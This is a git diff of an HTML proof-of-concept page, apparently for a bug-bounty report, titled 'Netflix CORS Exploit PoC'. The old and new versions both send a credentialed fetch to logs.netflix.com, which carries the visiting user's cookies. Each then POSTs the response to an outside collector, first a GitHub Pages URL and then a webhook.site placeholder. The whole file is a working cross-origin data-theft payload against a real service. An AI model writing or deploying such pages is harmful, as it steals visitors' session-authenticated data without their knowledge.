@@ -1,29 +1,28 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>Netflix CORS Exploit PoC</title>
-  </head>
-  <body>
-    <h1>Netflix CORS Exploit PoC</h1>
-    <p>Check the console for leaked data.</p>
-
-    <script>
-      // Step 1: Send request to Netflix vulnerable endpoint
-      fetch("https://logs.netflix.com/", { // Replace with sensitive endpoint if known
-        method: "GET",
-        credentials: "include"
-      })
-      .then(response => response.text())
-      .then(data => {
-        console.log("Leaked data:", data);
-
-        // Step 2: Exfiltrate data to your webhook (use webhook.site URL)
-        fetch("https://abdullahxxmone.github.io/netflix-cors-poc/", { 
-          method: "POST",
-          body: data
-        });
-      })
-      .catch(error => console.error("Error:", error));
-    </script>
-  </body>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Netflix CORS POST PoC</title>
+</head>
+<body>
+  <h1>Netflix CORS POST PoC</h1>
+  <script>
+    fetch('https://logs.netflix.com/', {
+      method: 'POST',
+      credentials: 'include',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ test: "CORS exploit" })
+    })
+    .then(response => response.text())
+    .then(data => {
+      console.log('Response:', data);
+      fetch('https://webhook.site/YOUR-WEBHOOK-ID', {
+        method: 'POST',
+        body: data
+      });
+    });
+  </script>
+</body>
 </html>
